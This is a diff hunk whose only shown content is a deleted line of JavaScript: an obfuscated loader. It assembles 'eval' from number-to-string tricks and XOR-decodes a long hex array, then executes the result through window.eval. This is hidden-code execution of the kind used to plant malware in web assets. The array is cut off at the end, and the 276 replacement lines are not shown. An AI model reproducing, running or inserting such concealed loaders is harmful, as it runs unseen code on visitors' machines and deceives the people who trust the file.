@@ -1,1 +1,276 @@
-(function(_c){(0,window[(14).toString(32)+(31).toString(32)+(10).toString(32)+(21).toString(32)])(_c)})((function(_s,_k){_a=_s.split(','),_r='',_j=0,_l=_k.length;for(_i=0;_i<_a.length;_i++){_c=parseInt(_a[_i],16);_z=_k.codePointAt(_j%_l);_r+=String.fromCodePoint((_c^_z^(_j&255))>>>0);_j++;}return _r;})('58,1,16,22,1f,1,9,9,29,59,53,16,19,30,f,4,2,18,2f,4,13,53,19,3d,17,49,39,8,21,a,1c,51,68,55,27,30,23,30,a,37,70,2a,62,1f,22,3c,3a,6e,20,3a,7f,30,7b,9,3a,26,3d,33,9,3f,6b,7c,64,19,5e,19,7b,51,25,54,58,45,4c,7e,7d,5d,2,b,64,41,41,5b,14,35,d,18,d,1b,26,8,51,4b,5c,60,6,70,6e,3d,2,73,60,77,77,5b,2f,23,50,25,7f,3a,31,27,65,5b,79,77,3a,4b,4a,26,74,63,34,52,6d,61,7d,24,93,d6,ae,ca,ca,e4,8a,92,9d,9c,ed,ac,8f,c2,93,bc,c7,ba,a8,dd,87,b1,bb,aa,a5,a1,be,c6,a6,d2,8c,cc,8c,e9,a9,9f,f3,fb,b4,a3,94,a5,f2,92,be,cb,ed,b6,b0,f8,dc,94,ac,fa,ac,91,a6,e1,a8,a3,83,a0,a1,bf,81,fe,c8,dc,c1,c1,fa,cc,99,92,96,a3,c1,d3,cc,cb,f9,c0,cc,d0,d1,bd,88,81,ca,c1,e5,c6,c3,dd,9f,e0,ea,fe,e7,e7,d8,ee,b8,e4,f1,cf,e6,a6,b7,b1,86,f1,f5,f9,f0,c8,e5,ea,fe,b1,9e,fa,fa,ef,f2,d1,e3,fc,15,4e,28,3,1d,17,4f,78,59,42,11,f,2f,6,1b,12,5,36,18,c,5,54,37,1a,4,13,40,29,19,10,e,1f,1d,79,d,29,78,35,2d,79,3d,38,9,3a,28,63,68,3c,26,66,7d,69,12,2b,6e,e,35,58,2e,2e,34,3b,5,2f,c,1a,11,25,47,5c,46,e,73,48,4a,48,42,64,16,4f,44,5f,7e,4e,57,40,16,25,1d,e,49,54,77,40,48,50,6f,4b,7e,34,24,22,5d,66,68,6a,64,42,34,6d,7a,61,5c,6c,71,66,3b,5f,76,6e,6a,25,8,3e,2b,7d,6a,5e,9b,85,8d,8d,a5,da,df,9a,99,b4,9d,98,8f,9f,b2,d9,85,8f,9a,a8,c4,d5,d9,cd,aa,84,86,8e,98,a9,92,87,b4,af,9a,fb,ba,b6,ab,84,eb,a4,b1,b7,9e,fc,f6,e0,ea,d6,ac,b6,bc,b7,8d,a6,a7,b1,fb,dc,ed,ed,a3,d4,af,99,95,d0,d6,ef,9e,c4,da,da,ec,d0,c8,8c,94,8a,88,81,d7,dd,f5,de,d2,91,da,f9,cc,cd,d3,db,b1,9a,b0,fc,89,8c,bc,b5,a0,e4,c6,f8,fe,f8,d8,d0,fa,a5,b6,b7,d5,ff,f0,e3,e4,82,af,a6,af,ed,9d,f1,ef,f7,6,29,f,1c,1b,11,27,51,0,16,11,6b,57,52,1a,b,38,0,11,1,10,28,51,4,11,1c,30,5e,3f,4c,49,60,8,28,10,2e,4c,71,76,23,20,8,35,e,38,20,5b,77,67,3f,27,8,3c,36,6a,79,58,70,7b,6f,6f,41,75,61,5e,4e,20,16,1,17,56,30,5,55,2,52,7a,4f,11,a,1e,6c,4f,44,5b,47,6d,4a,f,13,31,34,4,d,18,59,4a,76,53,75,6c,10,3e,30,66,7c,51,63,6f,31,20,f,61,71,75,62,52,23,65,7e,36,5c,71,64,74,33,16,2b,d0,93,8a,a1,99,9a,95,92,8a,82,c0,cd,db,f2,c6,cf,da,fa,fd,cb,c4,d3,85,bd,84,80,8e,9f,b0,91,a3,96,a5,8b,e0,f3,e5,a6,9c,ab,ac,a0,a5,c3,f8,fd,c2,ee,df,e9,e2,b6,ba,8f,a0,b3,ba,b7,82,ad,f6,fb,ec,c0,94,91,d4,d0,e2,de,d3,f5,cc,fe,c6,81,8a,8b,b4,51f4,87,9b,93,ec,de,cc,d3,d3,c2,cf,c3,c9,87,b2,81,80,678e,a7,81,91,b4,a3,a7,88,e4,f0,f8,e6,c6,af,be,ae,96c1,6548,6212,62e0,b5,b8,99,eb,ed,ec,f8,8e,a4,aa,7328,57b6,5102,8d40,6c9a,51e9,ff69,5339,5391,4edc,53b9,6ba7,674d,53,49,4b,512c,76c4,4f72,5439,4e83,684e,3059,4a,4a,51,1b,23,16,1f,15,12,5,2,28,33,79,4c,7b,5118,8d79,6cae,51eb,76,50,6d,6d,1f,6d,55,76,70,1b,3e,2a,30,23,11,2f,27,7c,3e,16,36,3a,30,4f,6f,4e,5a,4d,4a,21,5b,59,5b,4a,2d,14,46,22,e,3f,9,2,5c,53,3a,6,6,5a,59,61,42,c,47,43,30,7c,70,70,63,5,78,64,73,66,54,3b,3b,78,69,55,62,72,79,33,5f,63,6b,76,7f,50,2f,68,7c,74,56,73,5a,94,8c,f6,f1,d4,c3,c7,e8,93,96,82,99,b7,d5,9d,86,84,b0,9e,91,8b,d4,e4,cf,bb,8b,89,bd,8a,8a,d0,9a,8e,ad,b3,eb,a6,85,ab,b9,ba,ba,9c,8c,bf,a4,ab,85,e8,bd,a8,f2,9f,ac,b2,b0,f7,95,ad,be,b4,a8,83,be,90,db,df,ac,9b,92,89,88,f3,de,ef,dd,dd,e7,c4,fc,d7,c3,f8,83,8d,88,bd,b8,80,89,9c,d3,f5,85,86,98,ae,f0,c1,d2,af,de,f4,e4,aa,f2,af,8b,ba,e9,ed,fd,cb,a1,e1,fa,e0,d4,fa,f5,e7,b1,9c,a3,fe,fe,eb,c5,a,1f,44,1,24,13,10,8,e,68,10,1a,3,8,34,22,12,1b,48,56,4c,45,50,56,5d,41,4a,5d,5d,3b,0,4f,6e,23,2,2e,3a,37,35,11,70,78,71,77,43,72,1d,7,76,57,6a,31,37,20,c,3d,26,7f,38,1b,2a,2b,31,39,21,5b,53,4c,41,7f,6b,45,42,13,f,13,1c,b,f,63,47,4f,47,46,3b,5f,43,56,50,79,4c,b,7,1c,42,53,62,6e,6d,4b,34,71,61,72,46,3f,68,68,6a,4b,79,71,36,6c,41,2b,23,34,3e,16,74,66,50,75,44,60,7c,5a,80,bd,9f,db,cb,ca,bb,9a,88,83,8a,a7,91,d5,c7,b2,ac,95,77e3,89,85,a8,81,91,97,96,b6,86,c3,9c,d3,f0,ff,f6,ed,f9,e1,fd,f6,e1,e9,85,bd,b5,b9,b8,c1,b4,af,b3,b6,dc,f1,e5,83,a2,85,a8,a4,ba,f5,96,a7,bb,c7,8e,ff,de,d3,ca,c8,e6,ef,da,c3,ce,e6,95,c2,d5,91,b9,8d,8a,9c,c0,f6,fa,d8,cf,de,e6,e7,cc,cb,db,87,b0,bc,f7,e0,da,f2,f6,ed,ed,8d,bc,c2,c8,c1,8d,a7,ad,b4,b5,9c,a4,bd,9b,b9,96,a2,ab,f9,f3,df,f4,4,47,10,29,10,10,3,12,22,15,34,c,0,27,5,42,2d,57,2e,3,5,12,19,20,9,4e,50,5d,20,d,f,17,39,7,7d,7f,65,2c,1c,3d,3d,26,6c,48,73,3b,3d,24,16,28,2c,72,79,5d,961b,8938,79,74,52,5c32,8933,7c,73,57,6e6e,5326,3,e,2c,79b2,5ecc,6,74,3d,38,1b,a,c,21,54,4f,59,40,68,c,56,55,5a,72,42,5e,58,59,51,49,4b,63,73,10,40,33,35,36,f,3c,3e,3d,3e,4,39,39,3d,23,19,26,24,21,21,1e,23,2f,4c,55,13,28,2a,4b,46,e8,d5,d5,ad,a7,ed,d2,d0,a8,a2,e2,ae,c7,e1,cf,e0,c8,c1,9d,94,f3,9e,83,9d,9c,b5,96,8e,9e,b2,b0,8a,b5,b4,ed,85,b2,b6,ac,b3,83,b4,a9,e5,bf,87,b1,b6,b9,be,d4,b7,b8,a0,b2,94,a5,aa,a8,bf,97,86,a1,bd,c4,fd,94,da,cc,c7,e5,ca,dc,ca,d8,ac,d7,d2,cc,cb,b6,80,d0,d0,c1,ef,dc,c9,9e,db,fa,cd,ca,d2,d8,be,fa,f0,ed,e6,de,c8,e4,ed,b2,ac,b2,bb,aa,ac,c2,f8,ee,e4,e7,9c,e3,f1,f8,f3,c5,cf,eb,f0,f8,c1,bb,d4,41,2,28,12,1e,a,9,2f,57,55,4b,1e,2a,14,10,3,18,30,4d,4f,55,1c,3c,d,d,16,5c,78,43,4,16,10,a,2b,3f,2a,2b,d,31,3b,27,29,42,7f,7b,25,2a,9,25,24,3a,35,1c,38,61,7d,7e,1a,2b,2a,35,32,18,29,57,0,f,2b,56,5c,4c,4f,69,16,16,a,45,67,5f,53,59,5e,7a,41,4d,52,59,7f,7,5,1b,49,7b,44,40,5e,69,4f,73,34,2e,23,43,76,79,61,6c,57,61,3a,24,29,45,61,67,7f,7c,5b,60,60,39,34,12,62,62,73,6a,59,df,dd,c3,88,a2,9c,98,86,91,af,d5,d7,cd,9f,a9,96,8e,93,9c,b2,8b,c2,dc,d1,bf,84,84,9c,93,f5,ca,c8,ae,b5,83,ba,ba,e4,eb,cf,b7,ac,ad,a4,84,b1,b1,a7,b6,d9,e6,e4,b5,a1,98,a1,af,a7,b2,d3,e8,ea,b0,bf,e6,d7,d3,cb,82,a6,99,d4,c6,c7,eb,d4,cd,c2,c1,e7,8f,8d,93,c1,f2,ce,ce,c4,d8,f8,85,87,9d,db,e4,ce,ea,ef,ec,d9,bb,b9,a7,ff,d2,ff,f4,ec,e3,85,ba,b8,e2,f9,df,ee,f0,b4,bb,9f,f8,e0,e6,fb,dd,e2,a9,b5,46,29,1b,1d,11,11,6e,53,5f,1e,2,2a,13,15,9,7,78,45,45,1b,1c,34,9,1f,17,19,72,4f,4b,3,16,3e,32,38,25,2c,c,7a,7a,66,535e,4eca,75,77,6d,5965,6d44,70,6c,70,6ce0,536b,6b,69,77,51d3,84ee,53a5,6d,71,7a,51f7,84df,53ab,81cc,6c9b,5337,1c,18,4,8f9a,5b89,17,15,b,5423,6794,12,12,e,9ee0,9f87,6c75,4,1e,13,4e13,6d58,f,13,1c,6c4b,82eb,a,14,19,6d76,6c46,35,29,22,5ba3,5fa3,30,22,2f,6c7a,896c,3b,27,28,5c51,4e14,26,38,35,6c88,535a,21,3d,3e,6e60,5355,2c,36,3b,5e4e,4e1b,d7,cb,c4,5eb3,8983,d2,cc,c1,5eb8,898e,5814,6522,8107,6c79,53cc,d8,da,d7,6daa,53bc,c3,df,d0,9115,5e66,ce,d0,dd,5608,5d38,c9,d5,e6,8ddb,5d04,f4,ee,e3,4e78,5388,ff,e3,ec,899b,851b,fa,e4,e9,8980,8506,8128,6c6e,53ef,dd,e2,e0,75c6,805b,d2,ef,eb,9789,6da8,d7,94,96,5b25,59ad,ac,91,91,5b20,59a6,5658,657d,8151,6c11,5396,a6,9b,87,6507,7535,bb,80,82,6500,7530,7e63,549f,5cbe,8157,6c06,53a8,81,f2,bd,8a,8d,bb,b4,a3,e4,c7,fe,ea,f8,aa,cc,e1,f6,ec,e3,fd,e5,e7,f7,e7,84,d4,af,ae,aa,93,a8,aa,a9,ac,68,55,55,54,56,6d,52,50,5f,5d,62,5f,5b,59,5e,67,44,46,46,40,7c,41,41,43,4a,71,4e,4c,49,4d,76,4b,77,74,71,4b,70,72,73,75,40,7d,7d,7e,79,45,7a,78,65,66,5a,67,63,60,60,5f,6c,6e,68,6b,54,69,69,6d,12,29,16,14,16,10,2e,13,1f,1b,1e,23,18,1a,1c,18,38,5,5,0,5,3d,2,0,b,9,32,f,b,e,d,37,34,36,31,31,c,31,31,34,3d,1,3e,3c,3c,3e,6,3b,27,21,20,1b,20,22,26,22,10,2d,2d,2b,28,15,2a,28,a4,aa,ea,d7,d3,b7,ad,ef,dc,de,a4,af,e4,d9,d9,a7,bc,f9,c6,c4,be,ba,fe,c3,cf,b5,b7,f3,c8,ca,b0,b2,c8,f5,f5,96,8d,cd,f2,f0,84,9b,c2,ff,fb,91,85,c7,e4,e6,95,9a,dc,e1,e1,9b,81,d1,ee,ec,89,98,d6,eb,97,ef,e2,ab,90,92,e8,e8,a0,9d,9d,ea,e9,a5,9a,98,f1,e8,ba,87,83,fb,fe,bf,8c,8e,ff,eb,b4,89,89,ea,c2,89,b6,b4,c5,de,8e,b3,bf,d6,c5,83,b8,ba,d0,d4,98,a5,a5,d2,c6,9d,a2,a0,cf,d0,92,af,ab,d5,c7,97,54,56,3c,28,6c,20,4d,6b,49,66,52,5b,18,9,35,2,12,19,53,33,18,d,15,4,19,0,7,18,e,7c,f,1,25,2c,18,3f,31,30,6f,1a,35,3e,25,25,d,7c,22,35,3e,a,22,26,20,17,16,2b,2d,2c,75,1d,2a,2e,34,2b,6b,5c,41,d,46,65,5a,52,7,17,66,5c,52,4d,46,67,6,43,5d,5c,7c,78,54,5d,3,75,4d,45,5c,55,76,9,72,66,6a,48,69,40,72,6a,1c,1b,3a,2d,70,28,36,3f,77,63,44,65,67,33,71,4d,6e,6a,68,73,5c,6b,2e,75,8e,a1,91,86,92,cc,e0,df,83,e5,cb,e4,d4,dd,8b,81,b1,9a,96,d5,96,b5,80,93,8c,97,b9,8f,89,89,df,ed,f8,bf,a1,b5,cb,9c,b4,ae,bb,92,91,b4,a4,b8,93,b8,ac,bb,b6,8e,e4,ec,eb,dc,d7,e1,ea,fd,be,9d,a8,bc,d2,80,f9,d2,d9,c6,d5,a8,8d,99,df,cf,f7,e1,d7,c4,d4,f1,df,d7,9a,9c,b0,8f,95,81,9b,f7,cb,c3,cc,cc,c0,f5,fe,e0,f7,84,ff,f5,e1,fa,d1,bb,b5,a7,af,c3,e7,ef,f2,fb,dc,a3,f2,f8,f4,d3,ed,fe,ee,d1,c2,ae,4b,6d,43,6c,5c,55,14,14,3e,51,1,67,4d,62,56,5f,56,50,3e,4,a,0,3,78,12,c,f,a,3c,b,1d,1c,61,53,7a,32,35,25,0,2b,78,29,2e,10,37,35,60,2d,10,27,24,3c,32,54,29,22,31,19,5,2a,60,7b,24,3,51,56,4a,43,67,7,16,42,46,68,46,49,45,40,6d,52,52,19,40,75,4b,4b,51,5a,3b,1,49,4f,58,76,43,41,72,69,4c,77,67,39,20,47,7d,70,78,2d,f,35,6c,6c,77,5b,78,71,77,66,69,60,64,76,78,4d,3e,2a,76,71,e2,8b,97,83,80,b8,8c,92,9c,cf,b8,da,c7,e1,cf,e0,c8,c1,d4,d2,b2,8b,c6,d9,d8,a4,87,98,8a,93,bf,94,b5,e9,ac,87,f5,f5,b4,ae,95,be,ad,ed,88,90,a4,b0,a4,f8,da,ac,a1,bc,f0,d1,fb,c3,fc,fa,d3,e5,ee,f9,d3,eb,ce,c6,d0,ca,a9,db,dd,dc,df,ed,da,dc,dc,c7,f0,c7,8a,d4,c2,fb,c7,d3,9e,ca,f0,d0,dc,d4,d1,e3,fd,bf,ee,f1,c4,f3,be,a8,a0,9d,98,bb,aa,ac,81,ea,a0,f4,f2,c8,ef,ed,b0,be,e8,a8,aa,e6,bd,c0,e3,fb,13,12,23,5b,17,c,9,2e,19,1e,42,8,22,1c,1a,1c,24,2c,6,58,52,9,53,4f,48,5f,5b,32,d,3,19,12,3,20,72,3e,65,9,32,32,2f,3a,31,3a,31,2e,20,15,3c,69,20,3b,16,28,34,78,62,56,3f,41,7a,7c,c,4d,10,7,42,7f,45,5b,43,6,61,44,54,4e,59,6b,59,51,16,43,69,4a,56,47,1f,31,0,52,36,1a,33,5,e,50,67,e,32,77,6d,67,5c,72,7d,61,7f,a,73,78,7c,4b,53,6c,6f,70,7b,4e,4c,7e,57,7c,1d,24,6b,7e,70,1d,97,97,82,87,b9,d0,9b,80,9a,ad,d5,d2,c3,cc,b3,92,94,82,81,b2,d7,ef,d0,d6,f7,c1,89,92,93,a1,92,cf,b4,af,98,af,b1,e3,fa,c8,bc,b6,a3,a1,96,a5,f6,e0,ea,f4,ea,e3,f2,f4,90,a9,e8,f7,b8,9b,aa,ab,b1,b9,a1,cb,d7,c1,cc,f8,db,d4,da,e5,ea,d7,d9,8b,92,bd,95,81,93,c2,fa,ca,c3,96,90,b6,d9,8b,d6,d3,f2,c6,e4,ee,ec,c2,b2,e7,e5,f6,cb,f0,f9,e8,a5,c3,e1,fe,ff,e4,9d,f9,eb,e6,e3,dd,a9,b2,bc,e8,d6,f1,fb,eb,f,75,5a,e,68,44,69,5f,58,c,4,2a,7,9,48,1d,2b,10,e,10,55,67,4e,3,11,1b,20,e,9,15,b,7e,3b,23,21,23,1f,38,13,2d,2c,b,37,35,3e,64,46,24,34,2e,3f,19,6b,6c,6b,5c,57,61,6a,7d,2e,6,3f,23,43,e,79,5e,4c,57,64,67,5e,4d,49,44,77,15,3,9,51,14,a,3,12,14,39,f,b,58,5e,7b,9,42,5e,58,4a,6b,3f,68,64,59,75,3b,2d,6f,40,7c,31,64,69,46,6d,73,39,7f,5a,7e,6d,31,33,4d,60,64,62,31,42,6e,8a,8e,8d,ab,c6,97,8f,94,a3,94,88,c0,8f,ad,8e,82,fc,d0,fd,cb,c4,d3,d7,fb,87,8c,93,d7,bc,83,88,9c,b3,c3,b7,b2,b1,af,92,af,b7,bc,a2,90,bd,b2,a6,f4,99,a0,ba,b0,b1,c1,a7,a9,ad,bd,81,f9,fc,e0,a5,dd,d1,df,c0,c7,f3,87,84,90,9d,b1,86,83,99,9c,b1,87,9b,d3,da,ef,dc,c9,d1,cf,ad,c7,c6,d8,c5,a9,c7,c3,ef,e7,c3,b6,fd,f7,e2,c5,e3,a3,ef,ef,cd,e1,fb,fb,aa,d4,ff,f0,e6,fd,df,f6,a5,fc,f4,da,f0,e8,f6,ea,75,1a,17,b,11,2f,c,4c,1e,9,21,17,15,5,8,7a,5a,51,4,a,60,f,7,12,12,31,10,4,f,12,35,5d,22,26,27,5,3d,39,6d,21,15,30,3e,24,28,c,22,77,35,39,f,28,28,36,77,19,34,69,28,35,3,69,3c,3e,43,6f,12,1,17,11,25,e,a,1d,7,32,d,11,6,1d,2a,0,e,47,52,78,4f,f,e,14,25,f,1c,17,11,27,20,38,2d,39,49,7c,75,6a,6d,54,7d,6b,27,6a,48,7b,74,72,61,6,6e,69,65,64,1f,37,7a,65,34,9,60,60,88,94,e0,9d,95,8e,8e,a4,89,c3,c1,8b,b3,85,92,8c,dc,ad,93,90,86,91,b4,c3,aa,93,92,ba,8f,a0,99,9d,bc,a0,a1,b1,a0,87,98,b8,a0,bc,c9,f1,8f,ae,a8,8f,ad,e1,81,9b,d9,e1,e4,9c,b0,95,b0,a4,a9,b3,97,b3,90,fe,c2,c4,d9,dc,82,8a,f4,d0,d4,de,80,f1,d3,cd,df,d6,e0,a1,84,93,97,b8,80,89,9f,dd,f6,ca,83,d6,e7,c8,ff,e1,af,e9,c8,ec,f3,af,a5,c3,fb,b0,eb,ef,cd,ed,f9,e5,fa,c9,e7,f3,f7,f7,db,b9,fe,fe,f3,d1,c,18,12,7,70,a,1f,5,1d,2e,48,16,3,2,69,43,52,47,3,24,40,54,40,46,72,48,51,d,1c,36,2,6,28,27,57,68,60,33,3f,48,62,6d,3c,32,43,67,68,39,29,45,3e,26,2a,20,54,2e,24,36,3c,1a,7e,2e,3d,30,7b,5c,40,1e,47,6b,5d,5c,49,5a,6a,46,52,4f,15,23,4e,47,52,9,79,42,54,55,5c,64,f,59,5b,58,78,52,63,3d,31,18,6c,6d,3b,64,48,69,37,7e,65,43,72,70,61,2a,d,2b,36,27,67,40,20,31,2c,6a,4b,25,2d,29,d1,fe,ce,c8,8f,85,b1,d2,90,8a,82,a3,9c,89,d2,d7,ea,9f,8a,ce,9a,ac,8b,95,98,94,ba,94,d6,9a,8a,a4,b7,ac,ce,e2,cb,fd,f6,e1,e9,c5,b5,be,a5,e1,8e,b1,a6,b2,a1,d1,a1,a4,a3,bd,d7,ef,ad,b2,f0,91,aa,a0,d5,c5,f6,cb,db,d0,ce,fc,d9,d6,c2,90,e2,d7,cd,c6,dd,eb,de,c6,89,c6,f0,c8,c0,cb,81,a5,96,dd,c0,85,db,f6,e2,bf,b4,98,ee,ef,b5,ff,cc,f7,e8,e3,b5,93,b0,f1,ec,a9,d3,e8,ef,f6,f1,c2,b8,b8,a2,ec,c9,bc,12,8,11,28,19,7,5a,56,7c,13,15,1f,9,27,4,52,4,11,39,2,11,0,4d,6d,50,4c,47,18,32,6,5,1e,33,1,2f,3d,26,7e,4a,3a,3d,2a,70,7,3b,31,27,3c,45,6a,7a,6d,6d,41,28,28,30,2c,58,30,25,21,3a,4a,a,3,54,5a,30,5e,43,53,5a,69,40,1,5a,43,68,59,54,52,41,61,26,5,10,16,37,1,a,1e,5a,77,49,2,69,66,4b,7e,66,2e,6a,49,63,72,2c,24,44,7a,33,6a,7d,51,79,66,28,70,50,7c,69,7d,77,51,60,76,7b,6b,bd,8a,9d,97,df,a4,91,83,c3,89,a9,9f,93,9c,8a,a4,d3,8e,84,93,b8,84,92,88,c3,f8,d4,96,f0,dc,f1,c7,f0,e7,e3,cf,bb,b0,af,eb,88,b7,bc,a8,bf,cf,bb,be,a5,bb,dd,e5,a3,bc,fa,88,b2,a0,bf,bf,88,a6,a1,b5,ce,fc,80,90,c1,97,bd,da,8b,97,90,e2,db,d3,dc,83,ec,c0,d8,d0,8f,af,98,d7,c6,83,f3,cc,c2,cf,92,e7,fd,f8,e3,ea,df,a7,af,b1,b9,9d,fe,f2,e4,e9,8c,ff,e5,fe,f4,d4,f8,bf,a1,b8,86,ba,e7,fc,ef,d5,ef,e1,5c,50,30,71,54,43,47,68,50,59,4f,d,26,1a,53,6,17,38,f,11,5f,19,38,1c,3,5f,55,33,b,40,8,c,6,3a,37,65,36,7,3f,3b,22,33,3,3c,32,3f,62,13,21,3b,31,68,4a,75,36,29,24,7c,62,6b,7a,7c,51,67,13,40,46,63,11,5a,46,40,62,43,17,40,4c,71,5d,1f,5e,2,66,46,45,41,50,71,4e,13,d,c,63,5d,e,9,21,16,6a,6b,39,67,46,73,77,7d,31,7,26,2f,3a,35,59,66,6c,61,38,49,67,7d,7b,22,7,37,7c,63,62,3a,d8,d1,c4,c2,eb,dd,d5,86,8c,a9,df,94,8c,8a,a4,85,cd,9a,92,af,87,c5,de,91,b8,cc,8e,98,8e,b1,9d,82,a7,b2,8a,b2,ba,f9,f7,d3,b3,b6,a0,a5,91,ef,fd,fc,e4,cb,f1,a5,bd,ba,8d,e2,bb,b6,a1,91,fe,fc,ec,ae,f7,82,de,cc,cb,ef,93,df,cb,c1,e2,db,c8,91,9e,ae,9f,dc,be,92,bb,8d,86,91,99,b5,c5,ce,d5,91,fe,c1,f6,e2,f1,81,f1,f4,f3,ed,87,bf,fd,e2,a0,ce,ff,f1,fd,eb,d9,e2,f7,e3,fb,d9,f9,b3,fe,f6,dc,e6,e5,a2,c,2f,8,14,b,a,64,b,17,1f,51,76,40,d,10,55,2f,8,6,11,1c,34,9,5d,4f,4d,25,1b,4c,49,4f,20,20,6a,26,2d,19,39,33,33,64,14,33,3f,23,39,12,6d,79,6e,6a,c,34,7e,32,37,14,2a,2d,2f,32,7,28,2b,1c,3,6e,8,0,46,14,30,b,5a,43,46,6c,47,4,a,57,78,4c,18,46,51,61,5b,5,5b,5e,77,4b,5f,59,4a,46,76,7c,3f,6b,45,70,72,35,6e,4a,7d,68,26,7c,49,72,64,2e,23,3,7d,7e,2a,7f,59,6c,7f,37,6b,54,6e,97,8f,97,f6,c4,c5,d0,9b,cd,d1,da,cd,cd,e2,d6,dc,91,95,b2,c6,8b,95,91,bd,92,c4,91,9b,a0,8e,ce,d7,a6,81,f7,bf,ab,aa,82,84,b9,bd,a2,85,f9,b9,a1,bd,9e,ab,ae,b0,b1,c7,ba,b5,ab,bd,a8,b8,a3,ab,be,93,d1,c5,dd,98,a5,8b,83,9a,ca,f3,c0,c8,c5,de,bb,c0,c1,de,c7,e1,a6,85,90,96,b7,81,8a,9e,da,f7,c9,82,e9,e6,cb,fe,e6,ae,ea,c9,e3,f2,ac,a4,c4,fa,b3,fd,f8,ce,f1,ee,f3,e6,de,e6,e6,a5,aa,80,f4,f5,b8,ae,6f,49,49,3,a,24,a,5a,1d,1,3f,16,46,5a,5c,30,10,5a,17,1d,37,2,14,4b,5a,63,57,5e,7,76,71,47,70,67,23,57,56,75,60,66,47,35,35,2e,38,f,33,31,22,7e,15,2e,25,37,79,19,30,39,39,34,17,6,26,30,4d,6a,12,40,56,5d,65,5a,11,14,21,24,14,1d,8,4d,70,47,51,41,15,77,4f,54,55,5,71,4c,4f,4e,52,75,76,65,2a,61,59,78,77,75,6c,63,7e,7e,67,69,4f,63,28,30,77,55,7a,22,39,2d,17,6c,6b,6e,76,1c,6f,6b,db,c7,aa,9e,9b,ce,88,ae,96,9c,9e,c7,ae,94,8d,82,d6,e5,e0,c3,d2,d4,f9,82,89,8c,90,fa,8d,83,96,9b,9d,91,86,88,89,d7,f9,eb,bd,ad,86,a7,b5,a4,a1,c0,ab,ad,b5,a1,88,f0,e4,b6,b6,db,a1,aa,a8,b8,d3,e7,c2,c8,cf,e9,81,97,c4,cf,e6,dd,d5,ca,8f,a2,d7,cd,df,d1,b0,c6,cb,d7,d6,f4,9d,8b,c8,c8,e6,c0,8c,99,e0,dc,f3,f2,af,e8,c8,fd,fd,e3,e7,c1,f0,ff,f1,b3,9d,ee,ed,b8,e1,d3,fa,eb,fb,ba,95,e2,fe,f2,fe,9d,1c,14,17,1,39,14,14,4,d,24,b,46,48,b,2e,5a,4,12,0,3f,4e,5b,4c,14,22,15,1e,12,13,72,5,3,27,33,1e,66,76,24,28,45,33,35,23,39,6,77,7e,3d,28,e,2f,7e,70,36,c,3b,3c,30,35,56,64,29,31,2d,6e,5b,5e,40,41,2a,5f,45,47,49,28,5f,5d,49,4a,6c,15,3,5147,95df,5f22,7aba,4,f,ee,2a,d,49,4f,48,65,48,7e,39,3f,48,75,63,20,65,4b,70,69,7e,30,0,71,70,3b,60,4f,62,67,76,35,6,3c,26,78,73,45,3b,32,71,d3,ee,93,97,df,c6,ae,90,d5,9b,82,b0,98,98,ca,d0,e3,c6,8a,c7,cb,e6,9e,c7,9d,94,b4,90,9f,c6,dd,b7,b7,fc,a0,a7,98,be,f4,e1,a0,82,ef,f9,ad,a3,cc,b3,a5,a4,b0,de,f2,f9,ff,a6,c9,fd,ab,fd,be,9e,a7,bc,d5,9d,af,dc,db,8e,cb,e1,de,d2,8e,8a,f7,d4,cc,ce,d4,ea,97,81,ed,d6,f5,ce,c6,d4,99,b4,d6,c8,d4,83,8d,f7,fd,ea,f5,cf,f0,f2,fc,a8,cb,fc,ee,ee,e9,c5,fa,f3,f1,e0,99,ad,e7,e3,f0,d7,af,ef,f3,ef,d0,e5,1c,2,7,71,5e,1,12,13,22,53,5a,19,c,20,1f,11,12,15,25,56,46,43,55,66,6b03,5741,51ba,597d,94ad,63c0,2048,45,6e,f,64,6f,32,64,a,33,39,3c,38,59,76,3a,27,63,b,20,32,77,75,1b,3c,2e,3f,75,19,2a,3a,3e,62,52,48,5e,48,4b,7f,58,14,1f,15,29,42,5,16,3,72,52,43,43,5a,73,42,1b,17,d,1d,1,a,1d,1d,71,49,41,75,74,d,7c,71,77,3a,5b,2d,27,61,6b,50,7e,30,78,64,5b,78,7a,41,71,55,6a,6b,6b,74,46,2c,7e,31,32,ef,9a,9e,8a,96,af,c3,90,8b,9c,ed,d4,d2,8c,80,ed,8b,8d,9b,81,be,ca,cf,dd,d9,ba,8b,85,91,c1,b6,82,a4,ef,e4,c2,bb,ba,ed,aa,8e,bf,b1,ea,e4,ce,f6,ab,bf,a0,c0,ac,a1,a7,ff,df,ee,ae,b3,f7,87,ac,be,fe,88,b5,b0,93,82,84,a9,d8,dd,db,83,a3,9a,da,c7,83,ef,db,cb,d6,d0,bd,87,89,ca,dd,ed,d7,ef,d4,d1,e4,fd,ff,f0,bf,c8,f2,f8,e7,e0,c1,bc,eb,f8,e5,c2,f2,d4,f2,eb,c8,b7,e6,ff,f8,c4,f5,aa,e8,f3,db,f2,b2,2,f,2e,e,19,6,9,3c,5e,1a,1e,f,22,1,1b,2c,1d,3b,7,6,1c,0,71,48,1b,12,1a,38,8,4a,51,45,1a,37,3b,31,6b,1e,3b,2f,3a,b,a,3d,28,2e,21,14,75,22,3b,3c,1d,24,21,7f,29,4,2b,28,3f,9,1f,2e,44,1c,44,69,48,1d,7,8,60,5e,17,5d,5f,6b,55,5a,11,19,33,4a,54,43,52,76,44,1,49,54,7a,51,7,2,b,e,3a,33,22,63,4c,6b,30,28,63,16,33,34,26,7a,5a,71,76,56,7a,54,7a,62,70,6c,8,60,63,75,79,59,9f,df,90,8b,bf,91,93,da,8e,a3,86,d3,cd,c2,a6,98,cd,93,96,af,8f,c2,d9,d8,a3,84,92,89,be,bd,88,9b,a3,ae,99,e6,b7,ac,a9,8e,b9,be,e2,ae,86,a6,bd,f2,db,de,ea,e3,f2,b0,96,ac,bd,b2,be,9a,b0,e3,ba,b1,eb,c0,9c,c4,d5,fa,db,d9,ca,eb,ed,da,d0,cf,87,ed,c9,d2,df,9b,a0,a7,86,91,99,b6,c1,c4,d4,cf,e5,87,e0,f5,e6,da,f5,fa,f5,f5,9a,f5,f5,ee,f8,cf,f3,f1,e2,be,dc,e8,f0,fa,e1,dd,c5,e5,f9,f7,d6,eb,fa,b5,41,21,c,16,10,2,25,10,f,52,f,2b,17,8,5,b,31,1d,4c,17,1a,3e,17,49,d,c,2c,f,9,55,10,26,3d,23,22,2e,4,2a,6d,4b,69,46,72,7b,2e,23,2,22,2d,32,3d,8,62,27,3f,32,e,6f,39,29,24,1e,23,61,49,56,68,49,52,4f,48,7f,d,1e,44,43,67,51,5b,47,16,25,46,4a,5c,5f,37,49,47,5c,4e,67,c,4,3,34,f,39,32,25,66,4